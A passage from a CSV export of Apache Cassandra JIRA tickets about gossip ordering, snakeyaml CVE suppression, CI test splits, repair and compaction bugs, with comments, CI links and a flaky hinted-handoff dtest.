Thanks for offering, you already help a lot. I can quickly deal with this when the time comes. :);;;","03/Nov/22 12:47;adelapena;Just committed CASSANDRA-17987.;;;","03/Nov/22 19:44;e.dimitrova;Thank you for the ping [~adelapena] !

Patch rebased and CI started for 3.0 and 3.11. 

The other branches do not need CI as the only change will be to add the -a flag in the CircleCI ReadMe.

Pending commit on CI results and final confirmation with what we see in Jenkins (plus squash of the three commits as the rebase and updates required separate steps):
||Patch||Upgrade tests running||
|[3.0|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:17912-3.0-2?expand=1]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/2021/workflows/3dcf7f43-1ba1-40e1-b89e-0113837489eb]|
|[3.11|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:17912-3.11]|[CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/2020/workflows/70412fe4-f058-4435-aba4-b28d14eb258a]|
|[4.0|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:17912-4.0?expand=1]| |
|[4.1|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:17912-4.1?expand=1]| |
|[trunk|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:trunk-17912?expand=1]| |;;;","03/Nov/22 22:39;e.dimitrova;* 3.0 - 3304 tests have been run and there are two failures which matches Jenkins last runs. The two failures already have tickets opened and linked in Butler(CASSANDRA-17313 and CASSANDRA-17329).
 * 3.11 - 3676 tests have been run and 1 failed. Again this is matching Jenkins. There is already a ticket open for the failure and linked in Butler (CASSANDRA-17329).

[~mck] , do you want to take a final look now when we are ready also with 3.11 before I commit?;;;","04/Nov/22 09:56;mck;LGTM, +1

my only comment was the collapsing of multiple lines in the yaml to one long line. one line makes it hard to read and to review changes.;;;","04/Nov/22 14:21;e.dimitrova;Thanks [~mck] !
{quote}my only comment was the collapsing of multiple lines in the yaml to one long line. one line makes it hard to read and to review changes.
{quote}
I am sorry, I forgot to post on the ticket earlier - the collapse happens when we use the CircleCI cli tool to create our configuration from config-2_1.yml. I opened a support ticket for them and the explanation was that they rely on third-party package which is to be blamed for the collapse... This response was not rely satisfying, considering we use paid accounts and this configuration is the primary point to configure their product. They will continue looking on what they can do but from my experience, it will take some time.

Agreed with [~mck] offline to commit the patch now and hopefully the collapse will be solved later, I will follow up with CircleCI support teams. 
{quote}one line makes it hard to read and to review changes.
{quote}
Agreed, also for maintenance. That's why I raised the support ticket but with no good luck so far. 

Starting commit soon;;;","04/Nov/22 15:17;e.dimitrova;After a lot of sweating on double-checking the multi-branch commit, I am done:

To https://github.com/apache/cassandra.git

   e0331f631e..90fe8608a4  cassandra-3.0 -> cassandra-3.0

   b82dca6f81..43dcb5cd14  cassandra-3.11 -> cassandra-3.11

   8f06ec372e..6885bf9724  cassandra-4.0 -> cassandra-4.0

   162d504be0..1e67ef02f5  cassandra-4.1 -> cassandra-4.1

   51cc20a9f8..31341ee4bd  trunk -> trunk

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
IllegalArgumentException in Gossiper#order due to concurrent mutations to elements being applied,CASSANDRA-17908,13482448,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,20/Sep/22 18:44,28/Feb/23 21:04,13/Jul/23 08:40,11/Oct/22 00:46,5.0,,,,,,Cluster/Gossip,,,,0,,"org.apache.cassandra.gms.Gossiper#order was added due to sub-systems depending on a happens-before relationship of events even though Gossip does not provide such ordering… to help out we “order” the events discovered by gossip so we apply them in a predictable order… This has been found to have issues where we add the elements into the global state and under some conditions they get mutated causing ordering to fail

{code}
ERROR 2022-09-01T19:04:24,789 [GossipStage:1] org.apache.cassandra.service.CassandraDaemon:234 - Exception in thread Thread[GossipStage:1,5,main]
java.lang.IllegalArgumentException: Comparison method violates its general contract!
at java.util.TimSort.mergeLo(TimSort.java:777) 
at java.util.TimSort.mergeAt(TimSort.java:514) 
at java.util.TimSort.mergeForceCollapse(TimSort.java:457) 
at java.util.TimSort.sort(TimSort.java:254) 
at java.util.Arrays.sort(Arrays.java:1512) 
at java.util.ArrayList.sort(ArrayList.java:1464) 
at java.util.Collections.sort(Collections.java:177) 
at org.apache.cassandra.gms.Gossiper.order(Gossiper.java:1327) 
at org.apache.cassandra.gms.Gossiper.applyStateLocally(Gossiper.java:1334) 
at org.apache.cassandra.gms.GossipDigestAck2VerbHandler.doVerb(GossipDigestAck2VerbHandler.java:49) 
at org.apache.cassandra.net.MessageDeliveryTask.run(MessageDeliveryTask.java:70) 
at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) 
at java.util.concurrent.FutureTask.run(FutureTask.java:266) 
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) 
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) 
at org.apache.cassandra.concurrent.NamedThreadFactory.lambda$threadLocalDeallocator$0(NamedThreadFactory.java:116) 
at java.lang.Thread.run(Thread.java:750) [?:1.8.0_345]
{code}",,bdeggleston,dcapwell,,,,,,,,,,,,,"smiklosovic closed pull request #1869: CASSANDRA-17908: IllegalArgumentException in Gossiper#order due to concurrent mutations to elements being applied
URL: https://github.com/apache/cassandra/pull/1869


;22/Oct/22 11:18;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,CASSANDRA-18292,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Availability -> Process Crash,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Oct 11 00:44:55 UTC 2022,,,,,,,All,,,,"0|z18pq8:",9223372036854775807,,,,bdeggleston,,,,Critical,,5.0,,https://github.com/apache/cassandra/commit/af9439bcd781756a0d845215c4c03c5fd8e74b86,,,,,,,,,existing tests,,,,,"20/Sep/22 18:49;dcapwell;does not apply to 4.1 just trunk, but its a critical bug for trunk;;;","10/Oct/22 21:50;bdeggleston;+1;;;","10/Oct/22 22:42;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17908-trunk-157ED55B-495E-4111-ABEF-B28E00C769E4]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17908-trunk-157ED55B-495E-4111-ABEF-B28E00C769E4]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1991/]|
;;;","11/Oct/22 00:44;dcapwell;Buttler is saying https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/org.apache.cassandra.utils.memory/BufferPoolTest/testReleaseLocal is failing outside of this patch, so merging.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remediate CVE-2022-25857 - org.yaml_snakeyaml version 1.26 has vulnerabilities,CASSANDRA-17907,13482302,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,deepagkanaka,deepagkanaka,20/Sep/22 06:48,05/Oct/22 22:22,13/Jul/23 08:40,21/Sep/22 10:58,3.11.14,4.0.7,4.1,4.1-beta1,,,Dependencies,,,,0,,"|org.yaml_snakeyaml|[CVE-2022-25857|https://nvd.nist.gov/vuln/detail/CVE-2022-25857]|Fixed in: 1.31
21 days ago| |6|Impacted versions: <1.31
Discovered: a day ago
Published: 21 days ago
The package org.yaml:snakeyaml from 0 and before 1.31 are vulnerable to Denial of Service (DoS) due missing to nested depth limitation for collections.|",,deepagkanaka,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Security -> Denial of Service,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Sep 21 07:29:36 UTC 2022,,,,,,,All,,,,"0|z18oug:",9223372036854775807,,,,smiklosovic,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/70b0673d85ba67c7c1129d4e50da72ee0d5dc5d9,,,,,,,,,run CI,,,,,"20/Sep/22 11:11;brandon.williams;bq. One or more dependencies were identified with vulnerabilities that have a CVSS score greater than or equal to '1.0': 
bq. snakeyaml-1.26.jar: CVE-2022-38752, CVE-2022-38751, CVE-2022-38750, CVE-2022-25857, CVE-2022-38749
;;;","20/Sep/22 14:31;brandon.williams;CVE-2022-38750, CVE-2022-38751, CVE-2022-38752, CVE-2022-38749: DoS if parsing untrusted files
CVE-2022-25857: DoS due to limitation in nested collections

None of these affect us unless operators DoS themselves, so here are patches to suppress:

||Branch||CI||
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17907-3.11]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/642/workflows/b8769258-f173-4359-93ac-def3fe70ca74]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17907-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/640/workflows/b8c61e1e-4da4-4665-99dc-5022eb313b48], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/640/workflows/3dae8a21-fdf2-4b51-be44-6c490672623e]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17907-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/641/workflows/4ddc8bfd-a9f2-4eb5-b566-affcfd57bed9], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/641/workflows/753899cd-65aa-4ec0-b48c-e53f46219836]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17907-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/643/workflows/168ea9b1-cb6d-46f3-9a3d-a460b50c44da], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/643/workflows/60cb2510-17a7-4f3a-a027-9468a0889cb4]|
;;;","21/Sep/22 07:29;smiklosovic;patch and builds look ok to me, +1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test splits generated with --only-resource-intensive-tests only work on hosts with >= 27GB memory,CASSANDRA-17906,13482228,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,19/Sep/22 21:18,05/Oct/22 22:22,13/Jul/23 08:40,20/Sep/22 11:25,3.0.28,3.11.14,4.0.7,4.1,4.1-beta1,,Build,,,,0,,"As the title says, [here|https://github.com/apache/cassandra-builds/blob/trunk/build-scripts/cassandra-dtest-pytest.sh#L87] we use the ""only resource intensive"" flag to filter to just those tests, but machines with less than 27G will fail [this one|https://github.com/apache/cassandra-dtest/blob/trunk/conftest.py#L113].",,e.dimitrova,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Availability,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Sep 21 16:32:59 UTC 2022,,,,,,,All,,,,"0|z18oe0:",9223372036854775807,,,,mck,,,,Normal,,NA,,https://github.com/apache/cassandra-builds/commit/cf4a46721c937911cbf5df10dc6d24d8826c26e4,,,,,,,,,manual testing,,,,,"19/Sep/22 21:29;brandon.williams;I have a [branch|https://github.com/driftx/cassandra-builds/tree/CASSANDRA-17906] that adds --force-resource-intensive-tests for those calls which seems to work everywhere.;;;","20/Sep/22 04:56;mck;+1;;;","20/Sep/22 11:25;brandon.williams;Committed, thanks.;;;","21/Sep/22 16:03;e.dimitrova;I am wondering whether we need to do the same for CircleCI? In theory we should match the Jenkins and CircleCI config;;;","21/Sep/22 16:12;brandon.williams;I don't think CircleCI is experiencing this problem, but it's good to protect against it since if you do experience it, the result is simply some tests not being run.;;;","21/Sep/22 16:20;brandon.williams;I don't see --only-resource-intensive-tests being used in the CircleCI configs, I think it's okay.;;;","21/Sep/22 16:32;e.dimitrova;:( I just checked and it seems we don't run dtest_large tests there actually...

We skip the resource intensive dtests and from what I saw we do not have a job for them as in Jenkins....

We really need to align to run all jobs in all CI systems at some point... And even between j8 and j11 there are some discrepancies but those I will fix when I switch to j11&j17;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ccm logs not being collected to nightlies,CASSANDRA-17901,13481763,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,15/Sep/22 18:02,05/Oct/22 22:22,13/Jul/23 08:40,21/Sep/22 10:39,3.0.28,3.11.14,4.1,4.1-beta1,,,Test/dtest/python,,,,0,,"At least some of the time, Jenkins is failing to collect ccm logs and is uploading a zero byte tar archive to nightlies, for example: https://nightlies.apache.org/cassandra/trunk/Cassandra-trunk-dtest/1100/Cassandra-trunk-dtest/label=cassandra-dtest,split=5/

{quote}
09:25:06  + tar -cJf ccm_logs.tar.xz './tmp/*/test/*/logs/*'
09:25:06  tar: ./tmp/*/test/*/logs/*: Cannot stat: No such file or directory
09:25:06  tar: Exiting with failure status due to previous errors
{quote}",,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17894,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Unrecoverable Corruption / Loss,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Sep 21 10:39:52 UTC 2022,,,,,,,All,,,,"0|z18ljs:",9223372036854775807,,,,mck,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/3708168724aa4937cdfeaa843bdb3820039ad15e,,,,,,,,,run CI,,,,,"20/Sep/22 20:39;brandon.williams;This is only an issue when the failure is due to errors found in the logs since that failure exists outside of the normal failure path.  I have a [branch|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17901] that adds a direct 'failure' boolean to cleanup_cluster that is passed to consider the test failed, and ultimately preserves the test directory when --keep-failed-test-dir is being passed.

||Branch||CI||
|[3.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17901-3.0]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/647/workflows/a8a333ff-bec7-4d99-a893-c08b22a84552]|
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17901-3.11]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/648/workflows/dadef426-9be8-40aa-920d-ffaa1f680222]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17901-4.0]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/650/workflows/d8ab7bee-f5d2-4710-a239-47f89854bf01]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17901-4.1]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/649/workflows/a909f314-258f-41a8-9e34-3df30c97342f]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17901-trunk]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/646/workflows/c8efcf42-3524-4451-91c0-86ecb0620527]|

;;;","21/Sep/22 03:40;mck;+1;;;","21/Sep/22 10:39;brandon.williams;Thanks, committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Repair may fail with an assertion if two peers have overlapping mismatching ranges,CASSANDRA-17900,13481567,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,jmckenzie,jmckenzie,14/Sep/22 19:15,05/Oct/22 22:22,13/Jul/23 08:40,20/Sep/22 17:03,4.0.7,4.1-beta1,5.0,,,,Consistency/Repair,,,,0,,A little tweaking in {{RangeMap.java}} + a test showcasing it ought to tidy this up.,,jmckenzie,marcuse,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Sep 20 07:36:02 UTC 2022,,,,,,,All,,,,"0|z18kc8:",9223372036854775807,,,,marcuse,,,,Low,,4.0,,"https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=29c0ad80c919f02585f3ddfd7f9e0d2e80b62e2b",,,,,,,,,Modified + new unit testing to confirm new functionality works as expected,,,,,"16/Sep/22 19:53;jmckenzie;||Item|Link||
|PR|[link|https://github.com/apache/cassandra/pull/1860]|
|JDK8 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/300/workflows/bf2bf326-8deb-4a28-b9be-3a02832820e0]|
|JDK11 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/300/workflows/1f290242-1cf0-4d88-8751-468fd7d6cbc3]|;;;","20/Sep/22 07:36;marcuse;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Compaction NullPointerException when changing neverPurgeTombstones from true to false,CASSANDRA-17897,13481563,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,jmckenzie,jmckenzie,14/Sep/22 19:01,19/Sep/22 16:09,13/Jul/23 08:40,19/Sep/22 16:09,5.0,,,,,,Local/Compaction,,,,0,,"When changing neverPurgeTombstones from true to false we have a few fields in CompactionController nulled out; this means that ongoing compactions might get exceptions.

This is a pretty infrequent edge case so ok putting this trunk only and back-porting if someone runs into it on other versions.",,jmckenzie,marcuse,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Sep 15 18:02:00 UTC 2022,,,,,,,All,,,,"0|z18kbc:",9223372036854775807,,,,marcuse,,,,Low,,4.0,,"https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=ff5f4833aa3e11fcffd6bff1b15597fd5a38b864",,,,,,,,,New unit test to confirm NPE's don't fire,,,,,"15/Sep/22 17:58;jmckenzie;||Item|Link||
|PR|[link|https://github.com/apache/cassandra/pull/1858]|
|JDK8 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/298/workflows/155dee6b-0e39-4612-8a37-b9ff6b1f0c01]|
|JDK11 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/298/workflows/47be8104-cbf1-4a8d-9638-3fc9be6b4af3]|;;;","15/Sep/22 18:02;marcuse;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pass transaction finish calls from BigTableZeroCopyWriter to SequentialWriter components,CASSANDRA-17895,13481561,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,jmckenzie,jmckenzie,14/Sep/22 18:56,05/Oct/22 22:22,13/Jul/23 08:40,20/Sep/22 18:22,4.0.7,4.1-beta1,5.0,,,,Local/Other,,,,0,,"Replacements can currently fail with a Direct buffer memory OOM; we need to pass down transaction finish calls as mentioned in the Title to shore up a current resource closing hole.",,jmckenzie,jonmeredith,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Sep 19 17:17:59 UTC 2022,,,,,,,All,,,,"0|z18kaw:",9223372036854775807,,,,jmckenzie,jmeredithco,,,Low,,4.0,,"https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=22ec7eee7f340e8333055b2b10646cfe00cb6a84",,,,,,,,,"No new testing; small patch. Exercise all pre-commit tests.",,,,,"15/Sep/22 16:42;jmckenzie;||Item|Link||
|PR|[link|https://github.com/apache/cassandra/pull/1856]|
|JDK8 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/296/workflows/a603048c-0691-4530-a12d-b8540d2f1370]|
|JDK11 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/296/workflows/84760127-2070-4143-a3f7-621f143bff60]|;;;","19/Sep/22 17:17;jonmeredith;+1 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix hintedhandoff_test.py::TestHintedHandoff::test_hintedhandoff_window,CASSANDRA-17891,13481524,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,stefan.miklosovic,e.dimitrova,e.dimitrova,14/Sep/22 14:57,22/Nov/22 15:42,13/Jul/23 08:40,14/Oct/22 20:46,4.1,4.1-rc1,5.0,,,,CI,,,,0,,"hintedhandoff_test.py::TestHintedHandoff::test_hintedhandoff_window is flaky

 
{code:java}
self = <hintedhandoff_test.TestHintedHandoff object at 0x7f2d903b8630>

    @since('4.1')
    def test_hintedhandoff_window(self):
        """"""
            Test that we only store at a maximum the hint window worth of hints.
            Prior to CASSANDRA-14309 we would store another window worth of hints
            if the down node was brought up and then taken back down immediately.
            We would also store another window of hints on a live node if the live
            node was restarted.
            @jira_ticket CASSANDRA-14309
            """"""
    
        # hint_window_persistent_enabled is set to true by default
        self.cluster.set_configuration_options({'max_hint_window_in_ms': 10000,
                                                'hinted_handoff_enabled': True,
                                                'max_hints_delivery_threads': 1,
                                                'hints_flush_period_in_ms': 100, })
        self.cluster.populate(2).start()
        node1, node2 = self.cluster.nodelist()
        session = self.patient_cql_connection(node1)
        create_ks(session, 'ks', 2)
        create_c1c2_table(self, session)
    
        # Stop handoff until very end and take node2 down for first round of hints
        node1.nodetool('pausehandoff')
    
        node2.nodetool('disablebinary')
        node2.watch_log_for([""Stop listening for CQL clients""], timeout=120)
    
        node2.nodetool('disablegossip')
        node2.watch_log_for([""Announcing shutdown"", ""state jump to shutdown""], timeout=120)
        node1.watch_log_for([""state jump to shutdown""], timeout=120)
    
        log_mark_node_1 = node1.mark_log()
        log_mark_node_2 = node2.mark_log()
    
        # First round of hints. We expect these to be replayed and the only
        # hints within the window
        insert_c1c2(session, n=(0, 100), consistency=ConsistencyLevel.ONE)
    
        # Let hint window pass
        time.sleep(15)
    
        # Re-enable and disable the node. Prior to CASSANDRA-14215 this should make the hint window on node1 reset.
        node2.nodetool('enablegossip')
        node2.watch_log_for([""state jump to NORMAL""], timeout=120, from_mark=log_mark_node_2)
        node1.watch_log_for([""state jump to NORMAL""], timeout=120, from_mark=log_mark_node_1)
    
        log_mark_node_1 = node1.mark_log()
        log_mark_node_2 = node2.mark_log()
    
        node2.nodetool('disablegossip')
    
        node2.watch_log_for([""Announcing shutdown"", ""state jump to shutdown""], timeout=120, from_mark=log_mark_node_2)
        node1.watch_log_for([""state jump to shutdown""], timeout=120, from_mark=log_mark_node_1)
    
        log_mark_node_1 = node1.mark_log()
        log_mark_node_2 = node2.mark_log()
    
        def endpoint_downtime(node_to_query, node):
            mbean = make_mbean('net', type='Gossiper')
            with JolokiaAgent(node_to_query) as jmx:
                return jmx.execute_method(mbean, 'getEndpointDowntime(java.lang.String)', [node])
    
        while endpoint_downtime(node1, ""127.0.0.2"") <= 5000:
            time.sleep(1)
    
        # Second round of inserts. We do not expect hints to be stored.
        insert_c1c2(session, n=(100, 200), consistency=ConsistencyLevel.ONE)
    
        # Restart node1. Prior to CASSANDRA-14215 this would reset node1's hint window.
        node1.stop()
        node1.start(wait_for_binary_proto=True, wait_other_notice=False)
        session = self.patient_exclusive_cql_connection(node1)
        session.execute('USE ks')
        # Third round of inserts. We do not expect hints to be stored.
        insert_c1c2(session, n=(200, 300), consistency=ConsistencyLevel.ONE)
    
        # Enable node2 and wait for hints to be replayed
        node2.nodetool('enablegossip')
        node2.watch_log_for([""state jump to NORMAL""], timeout=120, from_mark=log_mark_node_2)
    
        node2.nodetool('enablebinary')
        node2.watch_log_for([""Starting listening for CQL clients""], timeout=120, from_mark=log_mark_node_2)
        node1.nodetool('resumehandoff')
        node1.watch_log_for('Finished hinted handoff')
        # Stop node1 so that we only query node2
        node1.stop()
    
        session = self.patient_exclusive_cql_connection(node2)
        session.execute('USE ks')
        # Ensure first dataset is present (through replayed hints)
        for x in range(0, 100):
            query_c1c2(session, x, ConsistencyLevel.ONE)
    
        # Ensure second and third datasets are not present
        for x in range(100, 300):
>           query_c1c2(session, x, ConsistencyLevel.ONE, tolerate_missing=True, must_be_missing=True)

hintedhandoff_test.py:303: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
tools/data.py:47: in query_c1c2
    assertions.assert_length_equal(rows, 0)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

object_with_length = [Row(c1='value1', c2='value2')], expected_length = 0

    def assert_length_equal(object_with_length, expected_length):
        """"""
        Assert an object has a specific length.
        @param object_with_length The object whose length will be checked
        @param expected_length The expected length of the object
    
        Examples:
        assert_length_equal(res, nb_counter)
        """"""
